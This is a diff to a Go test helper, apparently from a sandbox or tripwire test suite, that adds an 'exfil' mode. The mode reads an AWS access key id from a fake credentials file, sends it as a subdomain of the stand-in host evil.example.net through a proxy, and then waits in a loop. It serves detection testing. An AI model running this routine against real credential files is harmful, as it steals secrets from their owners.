@@ -78,6 +78,36 @@ func helper(mode string, args []string) int {
 		}
 		code, _ := strconv.Atoi(os.Getenv("HELPER_EXIT"))
 		return code
+	case "exfil":
+		// Reads the fake AWS key id in $TRIPWIRE_HOME/.aws/credentials,
+		// sends it in a hostname through $HTTPS_PROXY, then waits: only
+		// being stopped ends it (#3524).
+		data, err := os.ReadFile(filepath.Join(os.Getenv("TRIPWIRE_HOME"), ".aws", "credentials"))
+		if err != nil {
+			fmt.Println("no credentials:", err)
+			return 2
+		}
+		id := ""
+		for _, line := range strings.Split(string(data), "\n") {
+			if k, v, ok := strings.Cut(line, " = "); ok && k == "aws_access_key_id" {
+				id = v
+			}
+		}
+		proxy, _ := url.Parse(os.Getenv("HTTPS_PROXY"))
+		c := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxy)}, Timeout: 5 * time.Second}
+		if resp, err := c.Get("http://" + strings.ToLower(id) + ".evil.example.net/"); err == nil {
+			fmt.Println("sent:", resp.Status)
+			resp.Body.Close()
+		}
+		// Ticks into $HELPER_TICK, when it is set, while it waits: a job
+		// left running after the trip keeps ticking.
+		for i := 0; time.Duration(i)*20*time.Millisecond < time.Hour; i++ {
+			if tick := os.Getenv("HELPER_TICK"); tick != "" {
+				_ = os.WriteFile(tick, []byte(strconv.Itoa(i)), 0o600)
+			}
+			time.Sleep(20 * time.Millisecond)
+		}
+		return 0
 	case "dial":
 		// A TCP connection straight to args[0]: exit 0 when it is made.
 		c, err := net.DialTimeout("tcp", args[0], 3*time.Second)
